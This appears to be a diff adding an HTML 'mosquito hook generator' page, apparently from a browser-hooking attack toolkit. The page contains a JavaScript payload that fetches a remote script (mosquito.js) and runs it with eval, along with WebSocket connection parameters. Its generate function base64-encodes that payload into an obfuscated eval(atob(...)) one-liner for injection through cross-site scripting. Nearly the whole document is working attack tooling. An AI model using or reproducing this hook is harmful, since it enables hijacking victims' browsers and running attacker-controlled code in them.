@@ -1,0 +1,48 @@
+<head>
+<title>mosquito hook generator</title>
+<body>
+<h1>mosquito hook generator</h1>
+<textarea id=payload type="text/payload" style="height:500px;width:90%" >
+if (!window.xxxx) {
+
+var mosquito_params = {
+	// adjust params below!
+	base_url: 'http://localhost:8000/',
+	ws_host: 'localhost',
+	ws_port: 8082
+};
+
+var x = new XMLHttpRequest();
+x.open("GET", mosquito_params.base_url + 'mosquito.js?_=' + Math.random(), false);
+
+x.onreadystatechange = function() {
+	if (x.readyState == 4 && x.status == 200) {
+		eval(x.responseText);
+	}
+};
+x.send(null);
+window.xxxx = true;
+};
+</textarea>
+<br />
+<button onclick=generate() >Generate hook</button>
+<p>
+<code id="result" style="word-break:break-all;height:500px;width:90%;overflow:scroll;"></code>
+<script>
+function generate() {
+	var payload = document.getElementById('payload').value
+//      .replace(/\n/g, " ")
+//      .replace(/'/g, '"')
+      .replace(/\/\*[\s\S]*\*\//g, '')
+      .replace(/[^:]\/\/.*/g, '')
+	;
+//  var nbsp = '\u00A0';
+
+	var encr = btoa(payload);
+	var final_payload = "eval(atob('"+encr +"'))";
+	console.log(final_payload);
+	document.getElementById('result').innerText = final_payload;
+}
+</script>
+
+</body>
